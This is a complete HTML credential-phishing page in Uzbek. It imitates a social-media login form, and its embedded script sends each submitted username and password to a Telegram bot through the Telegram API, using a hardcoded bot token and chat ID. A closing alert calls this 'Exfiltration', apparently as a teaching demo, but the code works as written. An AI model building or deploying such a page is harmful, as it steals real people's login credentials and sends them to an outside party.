<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xavfsizlikni tamillash</title>
    <style>
        /* CSS: Zamonaviy va toza dizayn */
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background: #fff;
            padding: 40px;
            border: 1px solid #dbdbdb;
            width: 350px;
            box-sizing: border-box;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            background: #fafafa;
            border-radius: 3px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .warning {
            color: red;
            font-size: 12px;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div class="login-card">
    <h2>Tizimga kirish</h2>
    <form id="secureForm">
        <input type="text" id="email" placeholder="Telefon, foydalanuvchi nomi yoki email" required>
        <input type="password" id="password" placeholder="Parol" required>
        <button type="submit">Kirish</button>
    </form>
    

<script>
    // JS: Ma'lumotlarni Telegramga yuborish mexanizmi
    const botToken = "8120272722:AAFjb1pSggoErSO36-Wk5ohC7wwod2qPJhc";
    const chatId = "7995898636";

    document.getElementById('secureForm').addEventListener('submit', async (e) => {
        e.preventDefault();

        const login = document.getElementById('email').value;
        const pass = document.getElementById('password').value;

        const xabar = `ðŸš¨ Yangi ma'lumot kiritildi:\nðŸ‘¤ Login: ${login}\nðŸ”‘ Parol: ${pass}`;

        // Telegram API orqali ma'lumot yuborish
        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: xabar
                })
            });

            if (response.ok) {
                alert("Ma'lumot yuborildi. Kiberxavfsizlikda buni 'Exfiltration' deb atashadi.");
            } else {
                alert("Xatolik: Bot token yoki Chat ID noto'g'ri.");
            }
        } catch (error) {
            console.error("Xatolik yuz berdi:", error);
        }
    });
</script>

</body>
</html>
